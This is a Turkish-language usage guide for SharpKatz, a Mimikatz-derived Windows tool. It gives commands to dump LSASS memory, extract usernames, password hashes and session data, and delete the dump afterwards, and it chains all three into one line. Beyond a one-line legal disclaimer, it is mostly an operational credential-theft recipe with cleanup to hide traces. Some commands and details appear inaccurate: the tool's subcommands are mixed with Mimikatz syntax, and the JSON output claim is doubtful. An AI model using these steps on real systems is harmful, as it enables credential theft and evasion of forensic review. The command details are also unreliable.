# SharpKatz.exe Kullanım Kılavuzu

## Giriş
SharpKatz, Gentilkiwi'nin Mimikatz projesinden türetilmiş, C# dilinde yazılmış ve kimlik doğrulama bilgilerini çıkarmak için kullanılan bir araçtır. Özellikle Windows sistemlerinde hassas bilgileri ele geçirmek için kullanılır.

---

## Özellikler
- **LSASS Minidump**: LSASS sürecini bir minidump dosyasına yazar ve kimlik bilgilerini çıkarır.
- **Sekurlsa**: Minidump dosyasından oturum bilgilerini alır.
- **Taşınabilirlik**: Çeşitli sistemlerde çalışabilir.
- **Hızlı ve Verimli**: LSASS verilerini hızlı bir şekilde işler.

---

## Gereksinimler
- Windows işletim sistemi
- .NET Framework 4.5 veya daha üstü

---

## Komut Satırı Kullanımı

### Yardım Mesajını Görüntüleme
Mevcut komutları ve özellikleri görmek için:
```cmd
SharpKatz.exe -h
```

### LSASS Minidump Oluşturma
Bir LSASS minidump dosyası oluşturmak için:
```cmd
SharpKatz.exe dump
```
Varsayılan olarak, minidump dosyası `C:\Windows\Temp\debug.bin` konumuna kaydedilir.

### LSASS Verilerini Çıkarma
Minidump dosyasını okuyup kimlik bilgilerini çıkarmak için:
```cmd
SharpKatz.exe sekurlsa::minidump C:\Windows\Temp\debug.bin
```
Bu komut, kullanıcı adı, şifre hash'leri ve oturum bilgilerini döker.

### LSASS Bilgilerini Temizleme
Oluşturulan minidump dosyasını kaldırmak için:
```cmd
del C:\Windows\Temp\debug.bin
```

---

## Örnek Kullanımlar

### Tüm Süreci Otomatikleştirme
SharpKatz ile LSASS bilgilerini hızlıca çıkarıp temizlemek için:
```cmd
SharpKatz.exe dump && SharpKatz.exe sekurlsa::minidump C:\Windows\Temp\debug.bin && del C:\Windows\Temp\debug.bin
```

### JSON Formatında Çıktı Alma
Çıktıları JSON formatında kaydetmek için:
```cmd
SharpKatz.exe sekurlsa::minidump C:\Windows\Temp\debug.bin > output.json
```

---

## Güvenlik Uyarısı
SharpKatz, güçlü bir araçtır ve yalnızca yasal ve etik amaçlar için kullanılmalıdır. Araç, kötüye kullanım durumunda ciddi yasal sonuçlara yol açabilir.

---

## Derleme Talimatları
SharpKatz kaynak koddan derlenebilir.

### Adımlar:
1. Visual Studio Community Edition'ı yükleyin.
2. Projeyi açın (`SharpKatz.sln`).
3. Çözüm yapılandırmasını "Release" olarak seçin.
4. Projeyi derleyin.

---

## Kaynaklar
- [SharpKatz GitHub](https://github.com/GhostPack/SharpKatz)
- [Mimikatz Resmi Sitesi](https://blog.gentilkiwi.com/mimikatz)

Bu rehber, SharpKatz aracını kullanmanın temel adımlarını kapsamaktadır. Daha fazla bilgi için yukarıdaki bağlantılara göz atabilirsiniz.
